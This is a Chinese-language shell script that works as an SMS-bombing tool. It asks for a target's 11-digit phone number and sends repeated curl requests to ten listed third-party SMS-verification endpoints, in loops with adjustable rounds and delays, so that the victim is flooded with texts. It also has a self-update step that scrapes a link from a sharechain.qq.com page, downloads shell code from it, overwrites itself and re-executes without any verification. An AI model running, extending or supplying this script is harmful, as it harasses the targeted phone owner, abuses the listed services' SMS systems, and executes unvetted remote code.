#!/bin/sh
# ====================== 版本配置区 ======================
LOCAL_VER="2012"
VER_URL="https://sharechain.qq.com/3829c988eeff70874ac50d524a82b40e?qq_aio_chat_type=2"
SCRIPT_LINK_URL="https://sharechain.qq.com/b47d7151bf2b7801e6d84a6cb9c2e5ad?qq_aio_chat_type=2"
SELF_PATH="$0"
# ======================================================
echo "========================================"
echo "          脚本版本检测"
echo "========================================"
echo "本地当前版本：$LOCAL_VER"
CLOUD_VER=$(curl -s --connect-timeout 5 "$VER_URL" | grep -oE '版本[0-9]+' | head -n1 | sed 's/版本//')
[ -z "$CLOUD_VER" ] && CLOUD_VER="$LOCAL_VER"
echo "云端最新版本：$CLOUD_VER"
echo "========================================"
if [ "$LOCAL_VER" -lt "$CLOUD_VER" ]; then
    echo "⚠️  发现新版本！"
    echo -n "是否立即下载并更新？(y/n)："
    read user_choice
    case "$user_choice" in
        y|Y|yes|YES)
            echo "🔽 第一步：提取网址..."
            CODE_URL=$(curl -s --connect-timeout 10 "$SCRIPT_LINK_URL" \
            | sed -n 's/.*链\(https:\/\/[^ ]*\)接.*/\1/p' \
            | head -n1 \
            | tr -d '\r')
            if [ -z "$CODE_URL" ] || [ "${#CODE_URL}" -lt 20 ]; then
                echo "❌ 提取网址失败"
                exit 1
            fi
            echo "✅ 拿到网址：${CODE_URL:0:60}..."
            echo "🔽 第二步：获取脚本代码..."
            CODE=$(curl -s --connect-timeout 15 "$CODE_URL" | tr -d '\r')
            if [ -z "$CODE" ] || [[ "$CODE" != "#!/bin/sh"* ]]; then
                echo "❌ 获取脚本代码失败"
                exit 1
            fi
            echo "🔽 第三步：更新脚本..."
            TMP_FILE="${SELF_PATH}.tmp"
            echo "$CODE" > "$TMP_FILE"
            printf "%s\n" "$CODE" > "$TMP_FILE"
            if [ -s "$TMP_FILE" ]; then
                cat "$TMP_FILE" > "$SELF_PATH"
                rm -f "$TMP_FILE"
                echo "✅ 更新完成，重启脚本..."
                exec sh "$SELF_PATH"
                exit 0
            else
                rm -f "$TMP_FILE"
                echo "❌ 更新失败"
                exit 1
            fi
            ;;
        *)
            echo "⏭️  取消更新"
            ;;
    esac
else
    echo "✅ 当前已是最新版本"
fi
echo "========================================"
echo "  请选择模式"
echo "--------------------------------"
echo "1. 批量循环（所有接口）"
echo "2. 单项测试（1-10接口可用）"
echo "--------------------------------"
echo "请选择模式(1/2)："
read mode
echo "--------------------------------"
while true; do
    echo "输入目标手机号："
    read target
    if [ -z "$target" ]; then
        echo "手机号不能为空，请重新输入"
        echo "--------------------------------"
        continue
    fi
    if [ ${#target} -ne 11 ]; then
        echo "手机号必须为11位，请重新输入"
        echo "--------------------------------"
        continue
    fi
    break
done
echo "--------------------------------"
echo "校验通过，手机号: $target"
echo "--------------------------------"
test_id=""
if [ "$mode" = "2" ]; then
    echo "请输入测试接口编号(1-10)："
    read test_id
    echo "--------------------------------"
    echo "将测试接口：$test_id"
    echo "--------------------------------"
fi
if [ "$mode" = "2" ]; then
    send_delay=0
    round_delay=1
else
    echo "输入循环轮数（默认1）："
    read loop_count
    loop_count=${loop_count:-1}
    echo "请输入接口发送间隔（秒，默认0）："
    read send_delay
    send_delay=${send_delay:-0}
    echo "请输入轮次间隔（秒，默认1）："
    read round_delay
    round_delay=${round_delay:-1}
fi
echo "--------------------------------"
echo "开始执行 目标号码：$target"
echo "接口间隔：$send_delay 秒"
echo "轮次间隔：$round_delay 秒"
echo "--------------------------------"
loop_count=${loop_count:-1}
i=1
while [ $i -le $loop_count ]
do
    echo "[$(date +%H:%M:%S)] 第 $i 轮"

    # 接口1
    if [ "$mode" != "2" ] || [ "$test_id" = "1" ]; then
    echo "请求接口1"
    curl -s -X POST "https://www.jszyfw.com/PhoneNote/sendNote" -H "Content-Type: application/x-www-form-urlencoded" -d "mobileNum=$target&note=1"
    sleep $send_delay
    fi

    # 接口2
    if [ "$mode" != "2" ] || [ "$test_id" = "2" ]; then
    echo "请求接口2"
    curl -s -X POST "https://www.rsk.cn/api/auth/send-sms" -H "Content-Type: application/json" -d '{"phone":"'"$target"'"}'
    sleep $send_delay
    fi

    # 接口3
    if [ "$mode" != "2" ] || [ "$test_id" = "3" ]; then
    echo "请求接口3"
    curl -s -X POST "https://jxdj.jingxiangdj.com/index.php/api/client/config" -H "version_code:111" -H "Content-Type:application/json" -d '{"op":"sms_code","mobile":"'"$target"'"}'
    sleep $send_delay
    fi

    # 接口4
    if [ "$mode" != "2" ] || [ "$test_id" = "4" ]; then
    echo "请求接口4"
    curl -s -X POST "https://prod.chujingapp.com/ooc_assistant/api/sms/sendVerifyCode" -H "package-name: com.easy.abroad" -d "phone_num=$target"
    sleep $send_delay
    fi

    # 接口5
    if [ "$mode" != "2" ] || [ "$test_id" = "5" ]; then
    echo "请求接口5"
    curl -s -X POST "https://bounty.gomays.com/api/sms/send" -H "Content-Type: application/x-www-form-urlencoded" -d "type=1&event=register&mobile=$target&appType=goldhelp"
    sleep $send_delay
    fi

    # 接口6
    if [ "$mode" != "2" ] || [ "$test_id" = "6" ]; then
    echo "请求接口6"
    curl -s -X POST "https://api.duoduoxuanshang.cn/user/sendSMS" -H "Content-Type: application/x-www-form-urlencoded" -d "phone=$target"
    sleep $send_delay
    fi

    # 接口7
    if [ "$mode" != "2" ] || [ "$test_id" = "7" ]; then
    echo "请求接口7"
    curl -s -X POST "https://c.00242.cn/api/user/SendMsgCode" -H "Content-Type: application/json" -d '{"account":"'"$target"'","userful":"reglogin","version":"4752","apptype":"20","token":""}'
    sleep $send_delay
    fi

    # 接口8
    if [ "$mode" != "2" ] || [ "$test_id" = "8" ]; then
    echo "请求接口8"
    curl -s "https://api.zhuayoubao.com/httzyb/api/login/getVerificationCode?phone=$target&channel=29&packageName=com.zhuayoubao.box"
    sleep $send_delay
    fi

    # 接口9
    if [ "$mode" != "2" ] || [ "$test_id" = "9" ]; then
    echo "请求接口9"
    curl -s -X POST "https://bapt.cloudxin.vip/App/SliderVerificationAndSendCode" -H "Content-Type: application/json" -d '{"Mobile":"'$target'","Source":"Android","AppId":"YXJY003"}'
    sleep $send_delay
    fi

    # 接口10（已修正语法）
    if [ "$mode" != "2" ] || [ "$test_id" = "10" ]; then
    echo "请求接口10"
    curl -X POST "http://www.szsrcw.com/Mobile/Members/reg_send_sms.htm" -d "sms_type=login&mobile=$target"
    sleep $send_delay
    fi

    echo "本轮完成"
    i=$((i+1))
    [ $i -le $loop_count ] && sleep $round_delay
done
echo "--------------------------------"
echo "执行完毕"
